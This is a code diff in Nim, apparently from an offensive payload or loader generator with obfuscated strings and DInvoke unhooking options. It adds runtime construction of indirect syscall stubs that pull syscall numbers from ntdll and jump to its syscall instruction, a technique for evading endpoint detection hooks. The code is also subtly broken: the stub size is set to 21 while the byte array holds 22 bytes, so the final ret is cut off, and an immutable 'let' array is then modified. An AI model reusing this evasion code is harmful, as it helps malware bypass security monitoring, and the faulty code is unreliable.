@@ -145,7 +145,7 @@ when defined(GetSyscallStub):
 
     
     var 
-        SYSCALL_STUB_SIZE: int = 23
+        SYSCALL_STUB_SIZE: int = 21
 
     # Unmanaged NTDLL Declarations
 
@@ -245,7 +245,13 @@ when defined(GetSyscallStub):
     
     proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
         return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)
-    
+
+    proc find_syscall_address(startAddress: ptr byte, size: int): ptr byte =
+        for i in 0 ..< size - 1:
+            if startAddress[i] == 0x0F.byte and startAddress[i + 1] == 0x05.byte:
+                return addr startAddress[i]
+        return nil
+
     proc GetSyscallStub(functionName: cstring, syscallStub: LPVOID): BOOL =
         var
             file: HANDLE
@@ -254,6 +260,15 @@ when defined(GetSyscallStub):
             fileData: PVOID
             ntdllString: LPCSTR
             nullHandle: HANDLE
+        
+        let indirect_syscall = @[
+          byte(0x4C), byte(0x8B), byte(0xD1), # mov r10, rcx
+          byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, 0x00 (syscall)
+          byte(0x49), byte(0xBB), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r11, 0x00 (syscallJumpAddress)
+          byte(0x41), byte(0xFF), byte(0xE3), # jmp r11
+          byte(0xC3) # ret
+        ]
+
         when defined(wow64):
             ntdllString = obf("C:\\windows\\syswow64\\ntdll.dll")
         else:
@@ -314,7 +329,56 @@ when defined(GetSyscallStub):
                     # We adjust the functionVA by 7, as for some reason the functionVA is 7 ordinals off compared ntdll from disk to memory
                     functionNameVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2 + 7], rdataSection))
                     functionVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 8], textSection))
-                moveMemory(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
+                #moveMemory(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
+                when defined(verbose):
+                    echo obf("[*] Searching for function: ") & $functionName
+                let ssn = cast[ptr byte](functionVA + 4) # Get the SSN from the functionVA address
+                for i in 0 ..< 4:
+                  indirect_syscall[4 + i] = ssn[i] # Fill the indirect_syscall byte array with the SSN
+                when defined(verbose):
+                    echo obf("[*] Got SSN: ") & toHex(indirect_syscall[4]) & toHex(indirect_syscall[5]) & toHex(indirect_syscall[6]) & toHex(indirect_syscall[7])
+                # GetModuleHandleA for ntdll
+                when defined(DInvoke):
+                  var hModule: HMODULE = cast[HMODULE](MyGetModuleHandleA(ntdllString))
+                else:
+                  var hModule: HMODULE = MyGetModuleHandleA(ntdllString)
+
+                when defined(verbose):
+                    if (hModule == 0):
+                        echo obf("[*] MyGetModuleHandleA Error Code: ") & $[GetLastError()]
+                        return 0
+                    else:
+                        echo obf("[*] MyGetModuleHandleA Success")
+                
+                # GetProcAddress for functionName
+                var functionAddress: FARPROC = MyGetProcAddress(hModule, functionName)
+
+                when defined(verbose):
+                    if (functionAddress == nil):
+                        echo obf("[*] MyGetProcAddress Error Code: ") & $[GetLastError()]
+                        return 0
+                    else:
+                        echo obf("[*] MyGetProcAddress Success")
+
+                # get the syscallJumpAddress from the functionAddress
+                var syscallJumpAddress: LPVOID = find_syscall_address(cast[ptr byte](functionAddress), 40)
+
+                when defined(verbose):
+                    if (syscallJumpAddress == nil):
+                        echo obf("[*] Syscall Jump Address not found")
+                        return 0
+                    else:
+                        echo obf("[*] Syscall Jump Address found: ") & repr(syscallJumpAddress)
+
+                # Fill the indirect_syscall byte array with the syscallJumpAddress
+                var sja: uint64 = cast[uint64](syscallJumpAddress)
+                moveMemory(addr indirect_syscall[10], &sja, 8)
+
+                moveMemory(syscallStub, addr indirect_syscall[0], SYSCALL_STUB_SIZE)
+                # print final syscallStub
+                when defined(verbose):
+                    echo obf("[*] Syscall Stub: ") & toHex(indirect_syscall[0]) & toHex(indirect_syscall[1]) & toHex(indirect_syscall[2]) & toHex(indirect_syscall[3]) & toHex(indirect_syscall[4]) & toHex(indirect_syscall[5]) & toHex(indirect_syscall[6]) & toHex(indirect_syscall[7]) & toHex(indirect_syscall[8]) & toHex(indirect_syscall[9]) & toHex(indirect_syscall[10]) & toHex(indirect_syscall[11]) & toHex(indirect_syscall[12]) & toHex(indirect_syscall[13]) & toHex(indirect_syscall[14]) & toHex(indirect_syscall[15]) & toHex(indirect_syscall[16]) & toHex(indirect_syscall[17]) & toHex(indirect_syscall[18]) & toHex(indirect_syscall[19]) & toHex(indirect_syscall[20]) & toHex(indirect_syscall[21])
+
                 stubFound = 1
         return stubFound
 
@@ -561,5 +625,5 @@ let DInvokeUnhookStubs * = """
 
 let SyscallStubSizeStub * = """
 var 
-    SYSCALL_STUB_SIZE: int = 23
+    SYSCALL_STUB_SIZE: int = 21
 """
